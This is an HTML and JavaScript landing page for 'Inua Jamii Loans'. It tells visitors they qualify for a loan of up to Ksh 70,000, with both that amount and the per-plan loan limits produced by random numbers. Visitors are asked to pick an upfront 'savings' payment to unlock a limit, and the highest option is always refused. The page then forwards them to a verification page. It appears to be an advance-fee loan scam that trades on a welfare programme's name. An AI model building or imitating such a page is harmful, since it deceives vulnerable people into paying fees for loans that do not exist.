<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Inua Jamii Loans</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
    body{background:linear-gradient(135deg,#00ff59,#206f83);min-height:100vh;padding:1rem}
    .container{max-width:600px;margin:0 auto;background:#fff;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:1.5rem}
    h1{color:#120d3b;text-align:center;font-size:1.75rem;margin-bottom:.5rem}
    .subtitle{color:#666;text-align:center;font-size:.875rem;margin-bottom:1.5rem}
    .radio-group{display:flex;flex-direction:column;gap:.75rem}
    .radio-option{position:relative;border:2px solid #e5e7eb;border-radius:8px;padding:1rem;cursor:pointer;transition:all .2s}
    .radio-option.selected{border-color:#110a70;background:#f3f0ff}
    .radio-option input{position:absolute;opacity:0}
    .savings-amount{font-size:1rem;font-weight:600;color:#1f2937}
    .loan-limit{font-size:.875rem;color:#666;margin-top:.25rem}
    .result{margin-top:1.5rem;padding:1rem;background:#f3f0ff;border-radius:8px;font-size:.875rem;color:#180f46;text-align:center}
    .result.error{background:#ffebee;color:#c62828}
    .proceed-btn{display:block;width:100%;background:linear-gradient(135deg,#00ff59,#206f83);color:#fff;border:none;padding:1rem;border-radius:8px;font-size:1.125rem;margin-top:1.5rem;cursor:pointer;transition:background .2s}
    .proceed-btn:disabled{opacity:.7;cursor:not-allowed}
  </style>
</head>
<body>
  <div class="container">
    <h1>Inua Jamii Loans</h1>
    <p class="subtitle">
      Dear <strong style="font-weight:bolder;color:#00c853;" id="usernames">Customer,</strong>
      you qualify for a loan of upto <strong style="color:black;" id="loanAmount">Ksh 70,000</strong>.
      Choose your savings plan to continue to loan application.
    </p>

    <div class="radio-group" id="savingsOptions"></div>
    <div class="result" id="resultLabel">Select a savings amount to see your loan limit</div>
    <button class="proceed-btn" id="proceedBtn" disabled>Proceed</button>
  </div>

  <script>
    // Personalize name (optional)
    const fullName = localStorage.getItem("name") || "John Doe";
    const firstName = fullName.split(' ')[0];
    document.getElementById("usernames").textContent = firstName + ", ";

    // Random loan amount between 60,000 and 70,000 (display purpose only)
    const randomLoanAmount = Math.floor(Math.random() * (70000 - 60000 + 1)) + 60000;
    document.getElementById("loanAmount").textContent = "Ksh " + randomLoanAmount.toLocaleString();

    // Round candidate limit to nearest 10
    function getRandomLimit(min, max) {
      const raw = Math.floor(Math.random() * (max - min + 1)) + min;
      return Math.round(raw / 10) * 10;
    }

    const plans = [
      { savings: 220,  limit: getRandomLimit( 8500, 10000) },
      { savings: 250,  limit: getRandomLimit(10000, 20000) },
      { savings: 270,  limit: getRandomLimit(20000, 30000) },
      { savings: 300,  limit: getRandomLimit(30000, 40000) },
      { savings: 450,  limit: getRandomLimit(40000, 50000) },
      { savings: 950,  limit: getRandomLimit(50000, 60000) },
      { savings: 1550, limit: getRandomLimit(60000, 70000) }
    ];

    const savingsOptions = document.getElementById('savingsOptions');
    const resultLabel    = document.getElementById('resultLabel');
    const proceedBtn     = document.getElementById('proceedBtn');
    let selectedOption   = null;

    // Build options
    plans.forEach(plan => {
      const option = document.createElement('label');
      option.className = 'radio-option';
      option.innerHTML = `
        <input type="radio" name="savings" value="${plan.savings}">
        <div class="savings-amount">Ksh ${plan.savings.toLocaleString()}</div>
        <div class="loan-limit">Loan limit: Ksh ${plan.limit.toLocaleString()}</div>
      `;
      savingsOptions.appendChild(option);
    });

    // Handle selection
    document.querySelectorAll('input[name="savings"]').forEach(input => {
      input.addEventListener('change', (e) => {
        document.querySelectorAll('.radio-option').forEach(opt => opt.classList.remove('selected'));
        e.target.closest('.radio-option').classList.add('selected');

        selectedOption = plans.find(p => p.savings === Number(e.target.value));

        // Persist the chosen values for next pages
        localStorage.setItem('limit', String(selectedOption.limit));
        localStorage.setItem('saveamount', String(selectedOption.savings));

        if (selectedOption.savings === 1550) {
          resultLabel.textContent = 'Only existing members allowed';
          resultLabel.classList.add('error');
          proceedBtn.disabled = true;
        } else {
          resultLabel.textContent = `Your loan limit: Ksh ${selectedOption.limit.toLocaleString()}`;
          resultLabel.classList.remove('error');
          proceedBtn.disabled = false;
        }
      });
    });

    // Navigate next (set to Verification.html so the two pages stay in sync immediately)
    proceedBtn.addEventListener('click', () => {
      if (!selectedOption) return;
      // If your flow requires a different page first, change this line back.
      window.location.href = 'Verification.html';
    });
  </script>
</body>
</html>
